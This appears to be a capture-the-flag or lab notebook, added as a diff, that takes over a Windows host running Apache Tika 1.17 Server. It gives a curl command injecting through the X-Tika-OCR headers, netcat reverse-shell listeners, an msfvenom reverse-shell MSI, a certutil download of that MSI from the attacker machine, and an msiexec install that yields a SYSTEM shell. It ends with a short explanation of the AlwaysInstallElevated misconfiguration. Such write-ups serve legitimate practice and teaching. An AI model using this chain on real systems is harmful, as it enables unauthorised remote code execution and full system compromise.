@@ -1,0 +1,120 @@
+
+
+
+on port 61777 
+Apache Tika 1.17 Server
+
+
+┌──(root㉿kali)-[~]
+└─# searchsploit tika 1.17
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit)                    | windows/remote/47208.rb
+Apache Tika-server < 1.18 - Command Injection                                      | windows/remote/46540.py
+----------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+                                                                                                                     
+┌──(root㉿kali)-[~]
+
+
+
+
+
+for practice, we dont use metasploit.
+
+┌──(root㉿kali)-[/home/kali]
+└─# curl -X PUT http://10.201.50.34:61777/meta \ 
+  -H 'X-Tika-OCRTesseractPath: "cscript"' \
+  -H 'X-Tika-OCRLanguage: //E:Jscript' \
+  -H 'Expect: 100-continue' \
+  -H 'Content-type: image/jp2' \
+  --data-binary @payload.js
+"X-Parsed-By","org.apache.tika.parser.DefaultParser","org.apache.tika.parser.ocr.TesseractOCRParser","org.apache.tika.parser.EmptyParser"
+"language",""
+"Content-Type","image/jp2"
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 53
+listening on [any] 53 ...
+connect to [10.6.66.96] from (UNKNOWN) [10.201.50.34] 49758
+
+
+
+PS C:\Users\Cyberlens\Desktop> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+PS C:\Users\Cyberlens\Desktop> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+PS C:\Users\Cyberlens\Desktop> 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.66.96 LPORT=443 -f msi -o evil.msi
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of msi file: 159744 bytes
+Saved as: evil.msi
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+PS C:\Users\Cyberlens\Desktop> certutil.exe -f -urlcache http://10.6.66.96:8000/evil.msi C:\Users\Cyberlens\Desktop\evil.msi
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+PS C:\Users\Cyberlens\Desktop> 
+
+
+PS C:\Users\Cyberlens\Desktop> msiexec /quiet /qn /i C:\Users\Cyberlens\Desktop\evil.msi
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 443   
+listening on [any] 443 ...
+connect to [10.6.66.96] from (UNKNOWN) [10.201.50.34] 49791
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+
+
+
+The AlwaysInstallElevated privilege escalation works because of insecure Windows Installer (MSI) policy settings.
+
+How it works:
+
+If both these registry keys are set to 1:
+HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+Then any user can run any MSI file with SYSTEM privileges using msiexec.
+Why?
+
+The policy was designed to let users install software with elevated rights for convenience in enterprise environments.
+But if both keys are set, Windows will run any MSI installer as SYSTEM—even if a low-privilege user launches it.
+Attackers can create a malicious MSI (with msfvenom or msfconsole, or even with msibuild tools) that runs arbitrary code.
+When the user runs msiexec /i evil.msi, the payload executes as SYSTEM.
+In summary:
+AlwaysInstallElevated is a misconfiguration that allows any local user to escalate to SYSTEM by running a malicious MSI installer, because Windows trusts all MSI files to run with the highest privileges when both registry keys are set.
+
+
+
+
+
